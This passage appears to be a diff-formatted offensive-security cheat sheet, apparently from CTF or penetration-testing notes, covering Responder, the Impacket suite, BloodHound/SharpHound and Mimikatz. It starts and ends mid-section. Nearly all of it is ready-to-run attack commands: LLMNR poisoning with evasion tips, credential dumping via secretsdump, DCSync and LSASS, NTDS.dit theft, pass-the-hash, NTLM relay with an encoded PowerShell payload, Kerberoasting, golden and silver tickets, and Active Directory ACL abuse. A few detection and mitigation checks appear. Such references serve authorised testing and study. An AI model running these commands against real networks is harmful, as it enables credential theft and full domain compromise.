+    sudo sed -i 's/HTTP = Off/HTTP = On/' /usr/share/responder/Responder.conf
+    
+    exit 0
+}
+
+trap cleanup INT
+echo "[*] Press Ctrl+C to stop"
+while true; do sleep 1; done
+```
+
+### Detection and Evasion
+
+**Signs of Responder activity [Inference - based on network behavior patterns]:**
+
+```powershell
+# On Windows, detect LLMNR poisoning attempts
+Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-DNS-Client/Operational'; ID=3008} | 
+    Select-Object TimeCreated, Message
+
+# Monitor for unusual SMB authentication attempts
+Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4625,4624} | 
+    Where-Object {$_.Properties[10].Value -eq 3}
+
+# Check for WPAD-related queries
+Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-WinInet-Config/Operational'}
+```
+
+**Evasion techniques [Inference - based on common attack patterns]:**
+
+```bash
+# Throttle responses (reduce detection)
+# Edit Responder.py to add delays between responses
+
+# Target specific subnets only
+# Modify Responder.conf with RespondTo/RespondToName directives
+
+# Use analyze mode first
+sudo responder -I eth0 -A
+
+# Then target only active queriers
+# Manual configuration required
+```
+
+### Mitigation Verification
+
+**Check if LLMNR/NBT-NS is disabled:**
+
+```powershell
+# Check LLMNR status (should be disabled)
+Get-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\DNSClient" -Name EnableMulticast
+
+# Check NBT-NS status
+Get-WmiObject Win32_NetworkAdapterConfiguration | Where-Object {$_.TcpipNetbiosOptions -eq 2}
+
+# WPAD should be disabled
+Get-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Wpad"
+```
+
+### Advanced Hash Capture Techniques
+
+**Forced authentication triggers:**
+
+```bash
+# After capturing initial access, force authentication:
+
+# SMB share access
+smbclient //target/share
+
+# WebDAV authentication
+curl http://target/webdav
+
+# MSSQL connection
+mssqlclient.py user@target
+
+# All while Responder is running
+```
+
+**Custom Responder modules:**
+
+```bash
+# Location: /usr/share/responder/servers/
+
+# Create custom server
+sudo nano /usr/share/responder/servers/Custom.py
+
+# Register in Responder.conf
+# Custom = On
+```
+
+### Log Analysis
+
+**Parse Responder logs:**
+
+```bash
+# Extract unique usernames
+grep -h ":" /usr/share/responder/logs/*.txt | cut -d':' -f1 | sort -u
+
+# Extract domains
+grep -h ":" /usr/share/responder/logs/*.txt | cut -d':' -f3 | sort -u
+
+# Count captures by protocol
+ls /usr/share/responder/logs/ | grep -oP '^\w+' | sort | uniq -c
+
+# Most recent captures
+ls -lt /usr/share/responder/logs/*.txt | head
+```
+
+**Session log analysis:**
+
+```bash
+# View current session activity
+tail -f /usr/share/responder/logs/Responder-Session.log
+
+# Search for specific user
+grep -i "administrator" /usr/share/responder/logs/Responder-Session.log
+
+# Count authentication attempts
+grep -c "Sending NTLM authentication" /usr/share/responder/logs/Responder-Session.log
+```
+
+### Integration with Other Tools
+
+**Responder + CrackMapExec:**
+
+```bash
+# Capture hashes with Responder
+sudo responder -I eth0 -wfv
+
+# Use cracked credentials with CME
+crackmapexec smb 192.168.1.0/24 -u users.txt -p passwords.txt
+
+# Pass-the-Hash with captured NTLM
+crackmapexec smb 192.168.1.100 -u admin -H aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c
+```
+
+**Responder + Metasploit:**
+
+```bash
+# Import captured hashes into Metasploit
+msfconsole
+use auxiliary/analyze/crack_windows
+
+# Or use captured credentials
+use exploit/windows/smb/psexec
+set SMBUser administrator
+set SMBPass cracked_password
+set RHOSTS 192.168.1.100
+exploit
+```
+
+### CTF-Specific Scenarios
+
+**Quick hash capture:**
+
+```bash
+# Minimal command for fast capture
+sudo responder -I eth0 -w
+
+# Wait 30 seconds
+sleep 30
+
+# Check for captures
+cat /usr/share/responder/logs/*.txt
+```
+
+**Automated crack workflow:**
+
+```bash
+#!/bin/bash
+
+# Start Responder
+sudo responder -I eth0 -wfFbv &
+RPID=$!
+
+# Wait for captures (adjust time)
+sleep 120
+
+# Stop Responder
+sudo kill $RPID
+
+# Combine hashes
+cat /usr/share/responder/logs/*NTLMv2*.txt > hashes.txt
+
+# Crack with hashcat
+if [ -s hashes.txt ]; then
+    echo "[+] Hashes captured, starting crack..."
+    hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt --force
+    hashcat -m 5600 hashes.txt --show
+else
+    echo "[-] No hashes captured"
+fi
+```
+
+### Troubleshooting
+
+**Common issues:**
+
+```bash
+# Responder not capturing hashes
+# - Check if LLMNR/NBT-NS traffic exists: sudo responder -I eth0 -A
+# - Verify interface is correct: ip addr show
+# - Ensure no firewall blocking: sudo iptables -L
+
+# Permission denied
+# - Always run with sudo
+# - Check log directory permissions: ls -la /usr/share/responder/logs/
+
+# Conflict with other services
+# - Stop conflicting services: sudo systemctl stop apache2
+# - Check ports: sudo netstat -tlnp | grep -E ':(80|445|389|143)'
+
+# No authentication prompts
+# - Force authentication: use -F, -b, -w flags
+# - Check WPAD configuration
+# - Ensure SMB signing not required on targets
+```
+
+---
+
+## Important Related Topics
+
+**Critical tool categories to study next:**
+
+- **Burp Suite** (web application security testing, intercepting proxy)
+- **Metasploit Framework** (comprehensive exploitation framework)
+- **Wireshark** (packet analysis and protocol dissection)
+- **Nmap** (network discovery and service enumeration)
+- **Hydra/Medusa** (network service brute-forcing)
+- **SQLmap** (automated SQL injection exploitation)
+
+---
+
+## Impacket Suite
+
+Impacket is a Python-based collection of tools for network protocol manipulation, particularly focused on SMB, MSRPC, and other Windows protocols. Essential for Active Directory exploitation.
+
+### Core Impacket Scripts
+
+**psexec.py - Remote Command Execution**
+
+```bash
+# Basic authentication with credentials
+impacket-psexec DOMAIN/username:password@TARGET_IP
+
+# With hash (Pass-the-Hash)
+impacket-psexec -hashes :NTHASH DOMAIN/username@TARGET_IP
+
+# With specific command
+impacket-psexec DOMAIN/username:password@TARGET_IP "whoami"
+
+# Using different authentication methods
+impacket-psexec -hashes LMHASH:NTHASH DOMAIN/username@TARGET_IP
+impacket-psexec -no-pass -k TARGET.DOMAIN.LOCAL  # Kerberos
+
+# Connect to specific share
+impacket-psexec DOMAIN/username:password@TARGET_IP -share ADMIN$
+
+# Target multiple hosts from file
+for ip in $(cat targets.txt); do impacket-psexec DOMAIN/user:pass@$ip; done
+```
+
+**smbexec.py - Stealthier Command Execution**
+
+Does not drop service binary to disk, uses cmd.exe redirections.
+
+```bash
+# Basic execution
+impacket-smbexec DOMAIN/username:password@TARGET_IP
+
+# With hash
+impacket-smbexec -hashes :NTHASH DOMAIN/username@TARGET_IP
+
+# Execute single command
+impacket-smbexec DOMAIN/username:password@TARGET_IP "ipconfig /all"
+
+# Using specific share (default: C$)
+impacket-smbexec -share ADMIN$ DOMAIN/username:password@TARGET_IP
+
+# Specify service name for evasion
+impacket-smbexec -service-name CustomSvc DOMAIN/username:password@TARGET_IP
+```
+
+**wmiexec.py - WMI-Based Execution**
+
+```bash
+# Standard execution
+impacket-wmiexec DOMAIN/username:password@TARGET_IP
+
+# With NTLM hash
+impacket-wmiexec -hashes :NTHASH DOMAIN/username@TARGET_IP
+
+# Using Kerberos
+impacket-wmiexec -k -no-pass TARGET.DOMAIN.LOCAL
+
+# Execute command and exit
+impacket-wmiexec DOMAIN/username:password@TARGET_IP "hostname"
+
+# Alternative namespace (default: root\cimv2)
+impacket-wmiexec -namespace root/SecurityCenter2 DOMAIN/user:pass@TARGET_IP
+
+# Output to file
+impacket-wmiexec DOMAIN/user:pass@TARGET_IP "systeminfo" > sysinfo.txt
+```
+
+**atexec.py - Task Scheduler Execution**
+
+```bash
+# Create and execute scheduled task
+impacket-atexec DOMAIN/username:password@TARGET_IP "whoami"
+
+# With hash
+impacket-atexec -hashes :NTHASH DOMAIN/username@TARGET_IP "systeminfo"
+
+# Using Kerberos
+impacket-atexec -k -no-pass TARGET.DOMAIN.LOCAL "ipconfig"
+
+# Execute command at specific time (legacy, may not work on modern systems)
+# Modern Windows uses schtasks instead of AT command
+```
+
+**dcomexec.py - DCOM-Based Execution**
+
+```bash
+# Default DCOM object (MMC20.Application)
+impacket-dcomexec DOMAIN/username:password@TARGET_IP
+
+# Specify DCOM object
+impacket-dcomexec -object MMC20 DOMAIN/username:password@TARGET_IP
+impacket-dcomexec -object ShellWindows DOMAIN/username:password@TARGET_IP
+impacket-dcomexec -object ShellBrowserWindow DOMAIN/username:password@TARGET_IP
+
+# With hash
+impacket-dcomexec -hashes :NTHASH DOMAIN/username@TARGET_IP "whoami"
+
+# Execute single command
+impacket-dcomexec DOMAIN/username:password@TARGET_IP "cmd.exe /c whoami"
+```
+
+**secretsdump.py - Credential Extraction**
+
+```bash
+# Dump SAM, SECURITY, SYSTEM hives
+impacket-secretsdump -sam SAM.save -security SECURITY.save -system SYSTEM.save LOCAL
+
+# Remote credential dumping
+impacket-secretsdump DOMAIN/username:password@TARGET_IP
+
+# With hash authentication
+impacket-secretsdump -hashes :NTHASH DOMAIN/username@TARGET_IP
+
+# Dump NTDS.dit (Domain Controller)
+impacket-secretsdump -ntds NTDS.dit -system SYSTEM.save LOCAL
+impacket-secretsdump DOMAIN/username:password@DC_IP -just-dc
+
+# Dump specific user
+impacket-secretsdump DOMAIN/username:password@DC_IP -just-dc-user Administrator
+
+# Dump NTLM hashes only
+impacket-secretsdump DOMAIN/username:password@DC_IP -just-dc-ntlm
+
+# Output to file
+impacket-secretsdump DOMAIN/username:password@DC_IP -outputfile domain_creds
+
+# Dump with Kerberos
+impacket-secretsdump -k -no-pass TARGET.DOMAIN.LOCAL -just-dc
+
+# Use VSS (Volume Shadow Copy) method
+impacket-secretsdump -use-vss DOMAIN/username:password@TARGET_IP
+```
+
+**GetNPUsers.py - AS-REP Roasting**
+
+Identifies accounts without Kerberos pre-authentication and retrieves crackable hashes.
+
+```bash
+# Check single user
+impacket-GetNPUsers DOMAIN/username -no-pass -dc-ip DC_IP
+
+# Check users from file
+impacket-GetNPUsers DOMAIN/ -usersfile users.txt -dc-ip DC_IP -format hashcat
+
+# With credentials to enumerate all vulnerable users
+impacket-GetNPUsers DOMAIN/username:password -dc-ip DC_IP -request
+
+# Output formats
+impacket-GetNPUsers DOMAIN/ -usersfile users.txt -format john -dc-ip DC_IP
+impacket-GetNPUsers DOMAIN/ -usersfile users.txt -format hashcat -dc-ip DC_IP
+
+# Output to file
+impacket-GetNPUsers DOMAIN/ -usersfile users.txt -dc-ip DC_IP -outputfile asrep_hashes.txt
+```
+
+**GetUserSPNs.py - Kerberoasting**
+
+```bash
+# Request TGS for all SPN accounts
+impacket-GetUserSPNs DOMAIN/username:password -dc-ip DC_IP -request
+
+# Output to hashcat format
+impacket-GetUserSPNs DOMAIN/username:password -dc-ip DC_IP -request -outputfile spn_hashes.txt
+
+# Specific SPN
+impacket-GetUserSPNs DOMAIN/username:password -dc-ip DC_IP -request-user TARGET_USER
+
+# Save TGS tickets
+impacket-GetUserSPNs DOMAIN/username:password -dc-ip DC_IP -request -save
+
+# With hash authentication
+impacket-GetUserSPNs -hashes :NTHASH DOMAIN/username -dc-ip DC_IP -request
+```
+
+**GetADUsers.py - Active Directory Enumeration**
+
+```bash
+# Enumerate all AD users
+impacket-GetADUsers -all DOMAIN/username:password -dc-ip DC_IP
+
+# Specific user details
+impacket-GetADUsers DOMAIN/username:password -dc-ip DC_IP
+
+# Output to file
+impacket-GetADUsers -all DOMAIN/username:password -dc-ip DC_IP > ad_users.txt
+
+# With debug info
+impacket-GetADUsers -debug -all DOMAIN/username:password -dc-ip DC_IP
+```
+
+**lookupsid.py - SID Enumeration**
+
+```bash
+# Enumerate domain SIDs
+impacket-lookupsid DOMAIN/username:password@TARGET_IP
+
+# With known domain SID
+impacket-lookupsid DOMAIN/username:password@TARGET_IP 20000
+
+# Brute force RIDs
+impacket-lookupsid DOMAIN/username:password@TARGET_IP | grep SidTypeUser
+
+# Anonymous connection (if allowed)
+impacket-lookupsid anonymous@TARGET_IP -no-pass
+```
+
+**rpcdump.py - RPC Endpoint Enumeration**
+
+```bash
+# Enumerate RPC endpoints
+impacket-rpcdump DOMAIN/username:password@TARGET_IP
+
+# Anonymous enumeration
+impacket-rpcdump TARGET_IP
+
+# Specific port
+impacket-rpcdump -port 135 TARGET_IP
+
+# Output verbose
+impacket-rpcdump -debug DOMAIN/username:password@TARGET_IP
+```
+
+**samrdump.py - SAM Remote Protocol Enumeration**
+
+```bash
+# Dump SAM database remotely
+impacket-samrdump DOMAIN/username:password@TARGET_IP
+
+# With hash
+impacket-samrdump -hashes :NTHASH DOMAIN/username@TARGET_IP
+
+# Anonymous (if configured)
+impacket-samrdump TARGET_IP
+```
+
+**services.py - Remote Service Management**
+
+```bash
+# List services
+impacket-services DOMAIN/username:password@TARGET_IP list
+
+# Start service
+impacket-services DOMAIN/username:password@TARGET_IP start SERVICE_NAME
+
+# Stop service
+impacket-services DOMAIN/username:password@TARGET_IP stop SERVICE_NAME
+
+# Query service status
+impacket-services DOMAIN/username:password@TARGET_IP status SERVICE_NAME
+
+# Create service
+impacket-services DOMAIN/username:password@TARGET_IP create -name CustomSvc -display "Custom Service" -path "C:\Path\To\Binary.exe"
+
+# Delete service
+impacket-services DOMAIN/username:password@TARGET_IP delete SERVICE_NAME
+```
+
+**reg.py - Remote Registry Operations**
+
+```bash
+# Query registry key
+impacket-reg DOMAIN/username:password@TARGET_IP query -keyName HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion
+
+# Add registry value
+impacket-reg DOMAIN/username:password@TARGET_IP add -keyName "HKLM\\SOFTWARE\\Test" -v TestValue -vd "TestData" -vt REG_SZ
+
+# Delete registry key
+impacket-reg DOMAIN/username:password@TARGET_IP delete -keyName "HKLM\\SOFTWARE\\Test"
+
+# Save registry hive
+impacket-reg DOMAIN/username:password@TARGET_IP save -keyName HKLM\\SAM -o C:\\temp\\sam.save
+
+# Backup entire hive
+impacket-reg DOMAIN/username:password@TARGET_IP backup -keyName HKLM\\SYSTEM -o system.hive
+```
+
+**ntlmrelayx.py - NTLM Relay Attacks**
+
+```bash
+# Basic SMB relay to target
+impacket-ntlmrelayx -tf targets.txt -smb2support
+
+# Relay to specific target with command execution
+impacket-ntlmrelayx -t TARGET_IP -smb2support -c "whoami"
+
+# SOCKS proxy mode
+impacket-ntlmrelayx -tf targets.txt -smb2support -socks
+
+# Relay to LDAP (escalate privileges)
+impacket-ntlmrelayx -t ldap://DC_IP -smb2support --escalate-user USERNAME
+
+# Dump SAM on relay
+impacket-ntlmrelayx -tf targets.txt -smb2support -e payload.exe
+
+# Interactive mode
+impacket-ntlmrelayx -tf targets.txt -smb2support -i
+
+# Relay with specific interface
+impacket-ntlmrelayx -tf targets.txt -smb2support -ip ATTACKER_IP
+
+# Output results
+impacket-ntlmrelayx -tf targets.txt -smb2support -outputfile relay_results.txt
+```
+
+**getST.py - Request Service Tickets**
+
+```bash
+# Request TGT with hash
+impacket-getST -hashes :NTHASH DOMAIN/username
+
+# Impersonate user
+impacket-getST -spn cifs/TARGET.DOMAIN.LOCAL -impersonate Administrator DOMAIN/username:password
+
+# With AES key
+impacket-getST -aesKey AES_KEY DOMAIN/username
+
+# Request specific SPN
+impacket-getST -spn MSSQLSvc/SQL01.DOMAIN.LOCAL:1433 DOMAIN/username:password
+```
+
+**getTGT.py - Request TGT**
+
+```bash
+# Request TGT with credentials
+impacket-getTGT DOMAIN/username:password
+
+# With hash
+impacket-getTGT -hashes :NTHASH DOMAIN/username
+
+# With AES key
+impacket-getTGT -aesKey AES_KEY DOMAIN/username
+
+# Save ticket to specific file
+impacket-getTGT -dc-ip DC_IP DOMAIN/username:password
+
+# Export to use with other tools
+export KRB5CCNAME=/path/to/ticket.ccache
+```
+
+**ticketer.py - Golden/Silver Ticket Creation**
+
+```bash
+# Golden ticket (requires krbtgt hash)
+impacket-ticketer -nthash KRBTGT_HASH -domain-sid DOMAIN_SID -domain DOMAIN.LOCAL username
+
+# Silver ticket (requires service hash)
+impacket-ticketer -nthash SERVICE_HASH -domain-sid DOMAIN_SID -domain DOMAIN.LOCAL -spn cifs/TARGET.DOMAIN.LOCAL username
+
+# With specific groups
+impacket-ticketer -nthash KRBTGT_HASH -domain-sid DOMAIN_SID -domain DOMAIN.LOCAL -groups 512,513,518,519,520 Administrator
+
+# Custom ticket duration
+impacket-ticketer -nthash KRBTGT_HASH -domain-sid DOMAIN_SID -domain DOMAIN.LOCAL -duration 365 username
+
+# Export and use
+export KRB5CCNAME=username.ccache
+impacket-psexec -k -no-pass TARGET.DOMAIN.LOCAL
+```
+
+**raiseChild.py - Domain Privilege Escalation**
+
+```bash
+# Escalate from child domain to forest root
+impacket-raiseChild -target-exec DC.ROOT.DOMAIN.LOCAL CHILD.DOMAIN.LOCAL/Administrator:password
+```
+
+### Advanced Impacket Usage Patterns
+
+**Pass-the-Hash Workflow:**
+
+```bash
+# 1. Dump credentials
+impacket-secretsdump DOMAIN/user:pass@TARGET_IP -outputfile creds
+
+# 2. Extract NTLM hash from output
+# Format: USERNAME:RID:LMHASH:NTHASH:::
+
+# 3. Use hash for lateral movement
+impacket-wmiexec -hashes :NTHASH DOMAIN/Administrator@TARGET2_IP
+```
+
+**Kerberos Ticket Workflow:**
+
+```bash
+# 1. Request TGT
+impacket-getTGT DOMAIN/username:password -dc-ip DC_IP
+
+# 2. Set ticket environment variable
+export KRB5CCNAME=username.ccache
+
+# 3. Use ticket with other tools
+impacket-psexec -k -no-pass TARGET.DOMAIN.LOCAL
+impacket-smbclient -k -no-pass TARGET.DOMAIN.LOCAL
+```
+
+**NTLM Relay with Responder:**
+
+```bash
+# Terminal 1: Start Responder
+responder -I eth0 -rdwv
+
+# Terminal 2: Setup relay with ntlmrelayx
+impacket-ntlmrelayx -tf targets.txt -smb2support -c "powershell -enc BASE64_PAYLOAD"
+
+# Wait for authentication attempt
+```
+
+## BloodHound/SharpHound
+
+BloodHound visualizes Active Directory trust relationships and attack paths to identify privilege escalation vectors.
+
+### SharpHound Data Collection (Windows)
+
+**PowerShell SharpHound:**
+
+```powershell
+# Import module
+Import-Module .\SharpHound.ps1
+
+# Run all collection methods
+Invoke-BloodHound -CollectionMethod All -Domain DOMAIN.LOCAL -LDAPUser username -LDAPPass password
+
+# Collect specific methods
+Invoke-BloodHound -CollectionMethod DCOnly -Domain DOMAIN.LOCAL
+Invoke-BloodHound -CollectionMethod Session,LoggedOn -Domain DOMAIN.LOCAL
+
+# Stealth collection (no session enumeration)
+Invoke-BloodHound -CollectionMethod Group,LocalAdmin,GPOLocalGroup,Trusts -Domain DOMAIN.LOCAL
+
+# Output to specific directory
+Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Temp -ZipFileName domain_data.zip
+
+# Exclude domain controllers from session enumeration
+Invoke-BloodHound -CollectionMethod All -ExcludeDCs
+
+# Specify domain controller
+Invoke-BloodHound -CollectionMethod All -DomainController DC01.DOMAIN.LOCAL
+
+# Loop collection (persistence)
+Invoke-BloodHound -CollectionMethod Session -Loop -LoopDuration 01:00:00 -LoopInterval 00:05:00
+```
+
+**SharpHound.exe Executable:**
+
+```bash
+# All collection methods
+SharpHound.exe -c All
+
+# Specific collections
+SharpHound.exe -c DCOnly
+SharpHound.exe -c Session,Group,LocalAdmin,GPOLocalGroup,Trusts
+
+# With domain specification
+SharpHound.exe -c All -d DOMAIN.LOCAL
+
+# Custom domain controller
+SharpHound.exe -c All --domaincontroller DC01.DOMAIN.LOCAL
+
+# Output options
+SharpHound.exe -c All --outputdirectory C:\Temp
+SharpHound.exe -c All --outputprefix custom_name
+SharpHound.exe -c All --zipfilename results.zip
+
+# Exclude domain controllers
+SharpHound.exe -c All --excludedcs
+
+# Stealth mode (longer but less noisy)
+SharpHound.exe -c All --stealth
+
+# Throttle requests
+SharpHound.exe -c All --throttle 1000
+
+# LDAP timeout
+SharpHound.exe -c All --ldaptimeout 60
+
+# Verbose output
+SharpHound.exe -c All -v
+```
+
+**Collection Methods Explained:**
+
+- `All`: All collection methods
+- `Group`: Group membership information
+- `LocalAdmin`: Local administrator rights
+- `Session`: Active sessions on computers
+- `LoggedOn`: Currently logged on users via registry
+- `Trusts`: Domain trust relationships
+- `ACL`: Access Control Lists
+- `Container`: OU and container structures
+- `GPOLocalGroup`: Group Policy Object applied local groups
+- `SPNTargets`: Service Principal Names
+- `DCOnly`: Only data from DC (no computer enumeration)
+
+### BloodHound-Python (Linux)
+
+```bash
+# Install
+pip install bloodhound
+
+# Basic collection
+bloodhound-python -u username -p password -ns DC_IP -d DOMAIN.LOCAL -c All
+
+# Specific collection methods
+bloodhound-python -u username -p password -ns DC_IP -d DOMAIN.LOCAL -c DCOnly
+bloodhound-python -u username -p password -ns DC_IP -d DOMAIN.LOCAL -c Group,LocalAdmin
+
+# With NTLM hash
+bloodhound-python -u username --hashes :NTHASH -ns DC_IP -d DOMAIN.LOCAL -c All
+
+# Kerberos authentication
+bloodhound-python -u username -k -ns DC_IP -d DOMAIN.LOCAL -c All
+
+# Specify domain controller
+bloodhound-python -u username -p password -dc DC01.DOMAIN.LOCAL -ns DC_IP -d DOMAIN.LOCAL -c All
+
+# Output to specific directory
+bloodhound-python -u username -p password -ns DC_IP -d DOMAIN.LOCAL -c All --zip
+
+# Disable certificate verification
+bloodhound-python -u username -p password -ns DC_IP -d DOMAIN.LOCAL -c All --disable-autogc
+
+# Verbose
+bloodhound-python -u username -p password -ns DC_IP -d DOMAIN.LOCAL -c All -v
+```
+
+### BloodHound Setup and Usage
+
+**Installation (Kali):**
+
+```bash
+# Update package list
+sudo apt update
+
+# Install BloodHound and Neo4j
+sudo apt install bloodhound neo4j
+
+# Start Neo4j
+sudo neo4j console
+
+# Access Neo4j browser at http://localhost:7474
+# Default credentials: neo4j:neo4j (must change on first login)
+
+# Start BloodHound
+bloodhound
+
+# Or with custom Neo4j endpoint
+bloodhound --no-sandbox
+```
+
+**BloodHound Interface Operations:**
+
+1. **Upload Data:**
+    
+    - Click "Upload Data" button
+    - Select SharpHound JSON/ZIP files
+    - Wait for import completion
+2. **Pre-Built Queries:**
+    
+    - Find all Domain Admins
+    - Find Shortest Paths to Domain Admins
+    - Find Principals with DCSync Rights
+    - Shortest Path from Owned Principals
+    - Shortest Path to High Value Targets
+3. **Custom Cypher Queries:**
+    
+
+```cypher
+// Find all Domain Admins
+MATCH (n:User)-[r:MemberOf*1..]->(g:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"}) RETURN n
+
+// Find computers with unconstrained delegation
+MATCH (c:Computer {unconstraineddelegation:true}) RETURN c
+
+// Find users with SPN set (Kerberoastable)
+MATCH (u:User {hasspn:true}) RETURN u
+
+// Find shortest path from specific user to Domain Admins
+MATCH p=shortestPath((u:User {name:"USER@DOMAIN.LOCAL"})-[*1..]->(g:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"})) RETURN p
+
+// Find users with DCSync rights
+MATCH p=(n)-[:DCSync|AllExtendedRights|GenericAll]->(d:Domain) RETURN p
+
+// Find computers where Domain Users can RDP
+MATCH p=(g:Group {name:"DOMAIN USERS@DOMAIN.LOCAL"})-[:CanRDP]->(c:Computer) RETURN p
+
+// Find all users with local admin rights
+MATCH p=(u:User)-[:AdminTo]->(c:Computer) RETURN p
+
+// Find Kerberoastable users with path to DA
+MATCH p=shortestPath((u:User {hasspn:true})-[*1..]->(g:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"})) RETURN p
+
+// Find AS-REP Roastable users
+MATCH (u:User {dontreqpreauth:true}) RETURN u
+
+// Find computers with LAPS enabled
+MATCH (c:Computer) WHERE c.haslaps=true RETURN c
+
+// Find users with passwords in description
+MATCH (u:User) WHERE u.description CONTAINS 'pass' RETURN u
+
+// Find all computers in domain
+MATCH (c:Computer) RETURN c.name, c.operatingsystem
+
+// Find outbound trusts
+MATCH (d:Domain)-[r:TrustedBy]->(d2:Domain) RETURN d,r,d2
+```
+
+4. **Marking Owned/High Value:**
+    
+    - Right-click node → "Mark User as Owned"
+    - Right-click node → "Mark User as High Value"
+    - Use to track compromise progression
+5. **Path Analysis:**
+    
+    - Click edge (relationship) to see abuse information
+    - Follow "Abuse Info" tab for exploitation steps
+    - Note opsec considerations
+
+### Common BloodHound Attack Paths
+
+**GenericAll on User:**
+
+```bash
+# Change user password
+net user TARGET_USER NewPassword123! /domain
+
+# Or via PowerView
+Set-DomainUserPassword -Identity TARGET_USER -AccountPassword (ConvertTo-SecureString 'NewPassword123!' -AsPlainText -Force)
+```
+
+**ForceChangePassword:**
+
+```powershell
+# PowerView
+$NewPassword = ConvertTo-SecureString 'NewPass123!' -AsPlainText -Force
+Set-DomainUserPassword -Identity TARGET_USER -AccountPassword $NewPassword
+```
+
+**AddMembers (Group):**
+
+```bash
+# Add user to group
+net group "GROUP_NAME" TARGET_USER /add /domain
+
+# PowerView
+Add-DomainGroupMember -Identity 'GROUP_NAME' -Members 'TARGET_USER'
+```
+
+**GenericWrite on User:**
+
+```powershell
+# Set SPN for Kerberoasting
+Set-DomainObject -Identity TARGET_USER -Set @{serviceprincipalname='fake/svc'}
+
+# Disable pre-authentication for AS-REP roasting
+Set-DomainObject -Identity TARGET_USER -XOR @{useraccountcontrol=4194304}
+```
+
+**WriteDACL:**
+
+```powershell
+# Grant DCSync rights
+Add-DomainObjectAcl -TargetIdentity "DC=DOMAIN,DC=LOCAL" -PrincipalIdentity TARGET_USER -Rights DCSync
+```
+
+**WriteOwner:**
+
+```powershell
+# Change object owner
+Set-DomainObjectOwner -Identity TARGET_OBJECT -OwnerIdentity TARGET_USER
+
+# Then modify permissions as owner
+Add-DomainObjectAcl -TargetIdentity TARGET_OBJECT -PrincipalIdentity TARGET_USER -Rights All
+```
+
+## Mimikatz
+
+Mimikatz extracts credentials from memory, manipulates Kerberos tickets, and performs pass-the-hash/ticket attacks.
+
+### Basic Mimikatz Usage
+
+**Launch and Elevation:**
+
+```bash
+# Launch mimikatz
+mimikatz.exe
+
+# Enable debug privileges
+privilege::debug
+
+# Check privileges
+privilege::debug
+# Should return: Privilege '20' OK
+
+# Elevate token if not admin
+token::elevate
+```
+
+### Credential Extraction
+
+**LSASS Dumping:**
+
+```bash
+# Standard credential dump
+sekurlsa::logonpasswords
+
+# Export to file
+sekurlsa::logonpasswords > creds.txt
+
+# Dump specific authentication package
+sekurlsa::msv        # NTLM
+sekurlsa::kerberos   # Kerberos
+sekurlsa::wdigest    # WDigest (plaintext if enabled)
+sekurlsa::tspkg      # TsPkg
+sekurlsa::livessp    # LiveSSP
+
+# Dump all
+sekurlsa::logonpasswords full
+```
+
+**SAM Database Dumping:**
+
+```bash
+# Dump SAM (requires SYSTEM privileges)
+lsadump::sam
+
+# Dump from registry files
+lsadump::sam /sam:SAM.save /system:SYSTEM.save
+
+# Dump specific user
+lsadump::sam /user:Administrator
+```
+
+**LSA Secrets:**
+
+```bash
+# Dump LSA secrets
+lsadump::secrets
+
+# From registry files
+lsadump::secrets /system:SYSTEM.save /security:SECURITY.save
+```
+
+**Domain Controller Credential Extraction:**
+
+```bash
+# DCSync attack (requires replication rights)
+lsadump::dcsync /domain:DOMAIN.LOCAL /user:Administrator
+
+# DCSync all users
+lsadump::dcsync /domain:DOMAIN.LOCAL /all
+
+# DCSync with CSV output
+lsadump::dcsync /domain:DOMAIN.LOCAL /all /csv
+
+# Specific domain controller
+lsadump::dcsync /domain:DOMAIN.LOCAL /dc:DC01.DOMAIN.LOCAL /user:krbtgt
+```
+
+**NTDS.dit Extraction:**
+
+```bash
+# On domain controller - create shadow copy
+vssadmin create shadow /for=C:
+
+# Note shadow copy path
+# Copy NTDS.dit and SYSTEM hive
+copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\Temp\ntds.dit
+copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\Temp\SYSTEM.save
+
+# Extract on attacker machine
+secretsdump.py -ntds ntds.dit -system SYSTEM.save LOCAL
+```
+
+### Pass-the-Hash
+
+```bash
+# Pass-the-hash with mimikatz
+sekurlsa::pth /user:Administrator /domain:DOMAIN.LOCAL /ntlm:NTHASH /run:cmd.exe
+
+# Pass-the-hash to specific computer
+sekurlsa::pth /user:Administrator /domain:DOMAIN.LOCAL /ntlm:NTHASH /run:"cmd.exe /c dir \\TARGET\C$"
+
+# Multiple commands
+sekurlsa::pth /user:Administrator /domain:DOMAIN.LOCAL /ntlm:NTHASH /run:powershell.exe
+
+# Then in new window
+net use \\TARGET\C$ /user:DOMAIN\Administrator
+```
+
+### Kerberos Ticket Manipulation
+
+**Ticket Export:**
+
+```bash
+# Export all tickets
+sekurlsa::tickets /export
+
+# Export specific ticket types
+kerberos::list /export
+
+# Lists current tickets
+kerberos::list
+
+# Purge tickets
+kerberos::purge
+```
+
+**Ticket Injection:**
+
+```bash
+# Inject ticket from file
+kerberos::ptt ticket.kirbi
+
+# Pass-the-ticket
+kerberos::ptt C:\Path\To\Ticket.kirbi
+
+# Inject multiple tickets
+kerberos::ptt /directory:C:\Tickets
+```
+
+**Golden Ticket Creation:**
+
+```bash
+# Create golden ticket (requires krbtgt hash)
+kerberos::golden /user:Administrator /domain:DOMAIN.LOCAL /sid:DOMAIN_SID /krbtgt:KRBTGT_HASH /ptt
+
+# Golden ticket with specific groups
+kerberos::golden /user:FakeAdmin /domain:DOMAIN.LOCAL /sid:DOMAIN_SID /krbtgt:KRBTGT_HASH /groups:512,513,518,519,520 /ptt
+
+# Custom ticket lifetime
+kerberos::golden /user:Administrator /domain:DOMAIN.LOCAL /sid:DOMAIN_SID /krbtgt:KRBTGT_HASH /endin:525600 /renewmax:10080 /ptt
+
+# Golden ticket for specific service
